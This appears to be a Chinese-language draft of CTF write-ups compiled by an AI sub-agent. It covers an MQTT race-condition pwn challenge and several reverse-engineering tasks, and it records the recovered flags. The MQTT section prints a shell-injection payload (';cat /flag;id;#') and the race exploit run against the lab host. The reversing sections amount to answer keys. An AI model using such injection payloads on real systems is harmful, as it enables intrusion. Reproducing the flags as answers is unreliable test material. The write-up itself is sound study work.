# 子代理 B：历史题 WP 补全草稿

> 本稿供合并进主指南。结论区分本地样本校验、远程靶场输出和平台完成状态；“平台已完成”来自当前完成列表，未找到旧提交回执的题不声称能还原历史提交记录。

## 第十八届 CISCN 决赛 CTF——车联网安全 MQTT

**平台题目 ID：** 本地资料尚未找到。  
**当前状态：** 旧远程利用终端记录直接输出 `FLAG{XJ_MrpqTJhm63bmZ87L}` 并显示 `EXPLOIT SUCCESS`；平台完成列表也显示已完成。旧提交回执未找到。

### 附件与保护

附件 `D:\Downloads\mqtt.zip` 含 `pwn`、`libc.so.6`、`libcjson.so.1`、`libpaho-mqtt3c.so.1` 和动态加载器。保留的静态输出显示：程序是 x86-64 PIE；动态节包含 `BIND_NOW`（配合 RELRO）；GNU_STACK 为 RW 而非可执行（NX）。保护并不阻止利用应用层竞态。

`strings` 输出包含 MQTT broker `tcp://localhost:9999`、topic `diag`/`diag/resp`、命令 `auth`、`set_vin`、文件 `/mnt/VIN`，以及 shell 片段 `echo -n %s>/mnt/VIN;cat /mnt/VIN`。这些字符串提示程序把车辆 VIN 作为 shell 命令参数的一部分。

原始记录：`figures\raw\fig-pwn-27-mqtt-triage.txt`、`fig-pwn-28-mqtt-local.txt`、`fig-pwn-29-mqtt-remote.txt`；竞态示意图：`figures\fig-pwn-30-mqtt-toctou.png`。

### 利用步骤

1. 通过本地假 broker 运行附件，先确认 MQTT 交互：客户端连接后订阅 `diag` 和 `diag/resp`，服务端依次看到 `CONNECT`、`SUBSCRIBE`，回包 `CONNACK`、`SUBACK`。
2. 认证字段使用 VIN 派生的 32 位滚动哈希，日志记录公式为 `h = h * 31 + (signed char)c`。本地样例 VIN `LSVNV2182E2123456` 对应 token `470bc8e0`。远程复现日志打印其 token `054060a8`。
3. 发送合法 `set_vin` 请求。程序验证后会睡眠约 2 秒，但后续写文件的命令仍然读取共享全局 `arg`。
4. 在这段时间内并发发送一个未知命令，把全局 `arg` 改成 `;cat /flag;id;#`。竞态条件使已经通过认证的 `set_vin` 路径在醒来后把被替换的参数拼进 shell 命令。分号启动 `cat /flag`，`#` 注释掉后续 shell 文本。
5. 利用客户端持续等待响应，日志中 `diag/resp` 返回远端 flag 和 UID 信息。

远程执行命令（原记录）：

```text
timeout 100 python3 solve_mqtt.py env.xj.edisec.net 30953
```

成功输出关键行：

```text
[+] 推导 token = 054060a8  (hash: h=h*31+(signed char)c)
[>] 步骤1 (合法 set_vin, 通过校验后 sleep 2s): {"auth": "054060a8", "cmd": "set_vin", "arg": "1234567890"}
[>] 步骤2 (竞争覆写 arg 全局): {"auth": "054060a8", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
[<] diag/resp : b'ret: FLAG{XJ_MrpqTJhm63bmZ87L}uid=1001(ctf) gid=1001(ctf) groups=100 -n ;cat /flag;id;#>/mnt/VIN;cat /mnt/VIN'
[!] 命中 flag: FLAG{XJ_MrpqTJhm63bmZ87L}
[+] EXPLOIT SUCCESS
```

本地假 broker 同一竞态路径输出 `flag{local_test}` 和 `uid=0(root)`，最后为 `LOCAL_REPRO_OK`。本地 flag 只是 harness 测试值，不是平台 flag。

## 第一届启航杯——note（#563）

**当前状态：** 附件程序隔离校验候选通过，平台完成列表显示已完成；历史提交回执未找到。

原件从 `D:\Downloads\note.zip` 解压到 `玄机刷题\工作区\note_563`。输入是小型 ELF 样本 `note`。保留的 `代理-note-终端记录.txt` 详细记录了安全运行与取证：在 WSL 中启动程序，从 `/proc/<pid>/maps` 定位匿名映射中的 ELF magic，再从 `/proc/<pid>/mem` 导出运行时解包映像 `note_unpacked_mem.elf`；随后用 `readelf`、`objdump`、`xxd` 定位加密函数中的密文与常量。动态映像为 20,480 字节。

密文（43 字节）和 4 字节 key：

```text
ct  = 2559c31f3c41df061b7af835057cec5e6169f30c1347fe2a294b890b1e1c8b132873ba6e3e57ea3a1e5af7
key = 42 37 A1 7C
```

按位置循环使用 key，并异或从 1 开始递增的位置字节：

```python
plain[i] = ct[i] ^ key[i % 4] ^ ((i + 1) & 0xff)
```

逐步复原：

1. 对每个 `i` 取密文字节 `ct[i]`。
2. 取循环密钥字节 `key[i % 4]`，即索引依次为 0、1、2、3、0……。
3. 再异或 `(i+1) mod 256`。异或是自反运算，所以解密与加密公式一致。
4. 将所得字节按 ASCII 解码。
5. 把候选字符串送给原 ELF，在 `bwrap` 隔离环境、只读根文件系统和 5 秒超时下校验；原日志记载退出码 0。

结果：

```text
flag{pyrPGREJEB22LAdDfHNrf3kA55OKf86YFlnuG}
```

本次独立重算也得到 43 字节明文和相同候选，命令/输出见 `玄机刷题\记录\代理-WP补全-子代理B.txt`；全程分析证据与旧校验命令见 `玄机刷题\记录\代理-note-终端记录.txt`。

## 第一届启航杯——rainbow（#564）

**当前状态：** 由附件静态分析和两条本地脚本得到高置信 flag；平台完成列表显示已完成。旧分析记录明确说明当时未访问题页、未提交，因此没有可引用的旧提交回执。

附件位于 `玄机刷题\题目资料\rainbow\附件`。`rainbow` 是 x86-64 PIE ELF，`output.txt` 的内容是 `Encrypted Flag:` 加 86 个十六进制字符（43 字节）。反汇编表明 `xor_encrypt` 对每个字节执行 XOR；`hide_flag` 中的立即数恢复出演示串 `flag{this_is_flag}`，并确认 key 为 `0x5A`。演示串只是程序内置例子，不是外部文件中的 flag。

解密时对 `output.txt` 的密文逐字节异或 `0x5A`。也可以由 flag 格式首字节验证 key：`0x3C ^ ord('f') = 0x5A`。第一个五字节 `3C 36 3B 3D 21` 解出 `flag{`，完整结果为：

```text
flag{rj5Pnm6UGyGFc01BllivJliGIz37gxXfaj85z}
```

校验：总长 43 字节，首尾格式闭合，花括号中的 37 个字节均为字母或数字。脚本 `分析脚本\rainbow_xor_decrypt.py` 会打印密文长度、推得的 key、明文字节及格式校验；`rainbow_verify_key.py` 从 ELF 常量恢复内置 demo 并交叉验证 key。两脚本本次退出码均为 0。逐命令旧记录：`玄机刷题\记录\代理-Rainbow-终端记录.txt`；文字分析：`题目资料\rainbow\分析记录.md`。

## 第三届黄河流域公安院校网络安全技能挑战赛——go_for_it（#556）

**当前状态：** 本地原程序对候选输出 `Right!`，平台完成列表显示已完成；本地未找到提交回执。

### 问题建模

附件程序接受 32 字节输入并把内部 32 字节变换结果与常量比较。程序未公开明文变换过程。本目录的 `go_debugger.exe` 是随题分析时编写的 Windows 调试器：从程序基址加 RVA `0x9eec0` 处设断点，在比较发生时读取寄存器 `RAX` 指向的变换结果和 `RBX` 指向的目标值，恢复断点后让原程序继续，因此不需要猜哈希/加密算法。

### 探测与 GF(2) 求解

1. 取长度 32 的基准输入 `A`×32，记录目标 `expected` 和基准变换结果 `F(A)`。
2. 输入受 ASCII 字节约束；每个字节用 7 位表示。对每个位置依次翻转 7 个比特，合计 `32×7=224` 次探测。每个探测的差分列为 `F(A xor e) xor F(A)`。
3. 先检查结构：输入每个 8 字节块变化时，只有对应输出 8 字节块变化，故拆成四个互不影响的线性子问题。
4. 对每块收集 56 列，每列是一个 64 位输出差分；目标差分为 `expected_block xor F(A)_block`。在 GF(2) 上用高斯消元求列组合。
5. 四块均有满秩 `56/56` 且残差为 0，说明该目标在每块映射的像中，组合唯一。把解出的 bit mask 与基准字节 `0x41`（`A`）异或，拼接出 32 字节候选。
6. 不只信调试器输出：把候选直接喂给原程序，要求原程序打印 `Right!`、退出码为 0；再用断点复查候选变换等于目标常量。

原始终端记录明确给出四块 rank/residue：

```text
block 0: GF(2) rank=56/56 residue=0000000000000000 solution_mask=489513a4c816a7
block 1: GF(2) rank=56/56 residue=0000000000000000 solution_mask=efc92f5e1e3bf2
block 2: GF(2) rank=56/56 residue=0000000000000000 solution_mask=409d3f94683c72
block 3: GF(2) rank=56/56 residue=0000000000000000 solution_mask=79e7a27f3e5174
candidate_hex: 666c61677b63646533363931346433363339616238666661356338386635387d
candidate_repr: b'flag{cde36914d3639ab8ffa5c88f58}'
direct_exit_code: 0
direct_stdout_bytes: b'Right!\n'
local_checker_accepts_candidate: True
candidate_transform_matches_target: True
candidate_final_validation: True
```

Flag：`flag{cde36914d3639ab8ffa5c88f58}`。全部 basis 输入样本保存在 `题目资料\go_for_it_556\probes`；求解代码 `solve_go.py`；方法探索 `probe_linearity.py`；旧的 18 万字节原始求解 stdout 是 `分析产物\go_for_it_solve_raw.log`，完整 PowerShell 记录是 `记录\代理-go_for_it-终端记录.txt`。部分旧日志还包含其他题（例如 ezBase #541）的后续内容，引用 go_for_it 时应按日志内 `go_for_it` 命令段定位，不要把其余段误当本题附件。

## 商丘师范学院第四届网络安全及信息对抗大赛（校外赛）——不劳春风解我忧

**当前状态：** XXTEA 解密结果经重新加密校验；平台完成列表显示已完成。本地记录没有旧提交回执或能对应此 flag 的提交截图。

附件资料：`玄机刷题\题目资料\不劳春风解我忧\main.exe`、`solve_xxtea.py`。求解脚本保存了 11 个 32 位密文 word、密钥和 XXTEA 轮函数，因此可完全离线复现。

1. XXTEA 的 `DELTA=0x9E3779B9`，数据 word 数 `n=11`，标准轮数 `6+52//n=10`；初值 `sum=rounds×DELTA mod 2^32 = 0x2e2ac13a`。
2. 密钥按 little-endian word 使用：`0x12345678, 0x9ABCDEF0, 0xFEDCBA98, 0x87654321`。
3. 每轮根据 `(z>>5 ^ y<<2)`、`(y>>3 ^ z<<4)` 和 `(sum^y)`、`(key_word^z)` 的 XXTEA MX 表达式计算混合值；32 位加/减都按模 `2^32` 截断。
4. 解密从最后一个 word 向前反向执行，每个 word 减去对应 MX；每轮结束令 `sum -= DELTA`，共十轮。
5. 把解出的 word 用 `<I`（小端无符号 32 位）拼回字节串。开头为 `flag{`，末尾 `}` 后有两个 NUL 填充字节；去除固定长度缓冲的 NUL 后得到候选。
6. 用同一个实现重新加密解出的 word，与原始 11 个密文 word 比较，脚本输出 `reencryption matches target = True`。

运行 `python -B .\solve_xxtea.py` 的完整关键输出：

```text
words = 11 rounds = 10 expected sum = 0x2e2ac13a
decrypted words = ['67616c66', '3763657b', '31643439', '65322d63', '342d3637', '2d623561', '31326438', '3034392d', '33366266', '65376163', '00007d38']
candidate bytes = 666c61677b65633739346431632d326537362d346135622d386432312d3934306662363363613765387d0000
candidate text = flag{ec794d1c-2e76-4a5b-8d21-940fb63ca7e8}\0\0
reencryption matches target = True
```

候选 flag：`flag{ec794d1c-2e76-4a5b-8d21-940fb63ca7e8}`。本次复跑 transcript 为 `记录\代理-WP补全-子代理B.txt`。平台提交成功只能引用平台完成列表，不能把离线复算冒充远端回执。

## 商丘师范学院第四届网络安全及信息对抗大赛——ezRe

**当前状态：** 从随题程序的 Python bytecode 中静态还原 flag；平台完成列表显示已完成。未找到旧提交回执。本地平台 ID 未标出。

样本是 `玄机刷题\题目资料\ezRe\33.exe`（5,935,851 bytes）。这是 PyInstaller 打包文件。使用同目录 `extract_pyi.py` 读取文件末尾 88 字节 cookie（`!8sIIII64s`），校验 magic `MEI\014\013\012\013\016`，由包长和 TOC 偏移定位归档表；按 TOC 项的压缩标志解压 payload，提取 Python script entry 为 `pyi_extracted\33.marshal`（235 bytes）。

该 marshal 是 Python 3.9 code object；Python 3.12 的 `marshal.loads` 报 `ValueError: bad marshal data (unknown type code)` 是版本不兼容，不能据此认为数据损坏。查看原始 marshal bytes 可读出 names `base64`、`encoded_flag`、`b64decode`、`decode`、`flag`、`print`；常量包括下面的 Base64 字符串和编码名 `utf-8`。对应逻辑是：

```python
import base64
encoded_flag = "ZmxhZ3s0YjE0YTI1Ny00MzM2LTQxNTItOWYwNi00OGM3YjF9"
flag = base64.b64decode(encoded_flag).decode("utf-8")
print(flag)
```

按标准 Base64 解码，得 `b'flag{4b14a257-4336-4152-9f06-48c7b1}'`，UTF-8 解码后为：

```text
flag{4b14a257-4336-4152-9f06-48c7b1}
```

候选长度 36，前缀 `flag{`、闭合括号 `}` 均成立。验证命令及输出记录在 `记录\代理-WP补全-子代理B.txt`。为避免执行未知 PE，本次没有直接运行原始 EXE；判断依据是随题归档里的完整模块字节码常量和被引用的标准库调用。
